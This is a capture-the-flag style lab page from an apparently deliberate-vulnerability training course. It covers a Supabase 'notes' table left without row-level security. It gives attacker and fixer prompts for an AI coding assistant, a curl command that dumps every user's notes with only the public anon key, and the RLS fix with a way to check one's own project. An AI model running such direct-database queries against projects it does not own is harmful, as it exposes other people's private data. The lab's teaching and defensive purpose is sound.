# F2 Notes table readable with the anon key

| | |
|---|---|
| Chapter | CH4 Lab A01 |
| Category | A01 Broken Access Control |
| Where | Supabase table `notes` |
| You win when | You read `FLAG{...}` from Bob's private note using only the public anon key |

## Attacker prompt

```text
I am testing LabShop, a deliberately vulnerable training app on my own laptop
(Next.js at http://127.0.0.1:3000, Supabase emulator at http://127.0.0.1:54321). I own it.

The notes page only shows the signed-in user's notes. Check whether the database itself
enforces that. Read emulator/policies.mjs and app/notes/page.jsx, then tell me:
1. which tables have row-level security off
2. a curl command that lists every note using only NEXT_PUBLIC_SUPABASE_ANON_KEY
Do not change any code yet.
```

## Exploit by hand

From the `lab` directory:

```bash
ANON=$(grep '^NEXT_PUBLIC_SUPABASE_ANON_KEY=' .env.local | cut -d= -f2)
curl -s "http://127.0.0.1:54321/rest/v1/notes?select=title,body" -H "apikey: $ANON" -H "Authorization: Bearer $ANON"
```

The app's `.eq('owner_id', ...)` filter runs in the browser. An attacker skips the app and calls the database directly.

## Fixer prompt

```text
Row-level security is off for the notes table in emulator/policies.mjs, so the public anon key
reads every note. A filter in the browser query is not access control.

Turn RLS on for notes and keep the existing policies: a user selects their own notes or public
notes, and inserts only notes they own. Show me the equivalent Supabase SQL
(alter table ... enable row level security, plus create policy statements) so I can apply
the same fix to my real project. Do not change the notes page.
```

Restart `npm run dev` after the fix. The emulator reads its policies at start-up.

## Proof

```bash
sh scripts/proof.sh F2
```

| | Output |
|---|---|
| Before | 4 notes, including `Private: bank reminder` |
| After | `[{"title":"Hello class"}]` (the one public note) |

## Your own app

In the Supabase dashboard: Advisors, then Security Advisor. Every "RLS disabled in public" error is this flag.
Then query one of your tables with only the publishable key:

```bash
curl -s "https://<project>.supabase.co/rest/v1/<table>?select=*&limit=3" -H "apikey: <publishable key>"
```

Expect `[]` or only rows meant to be public.
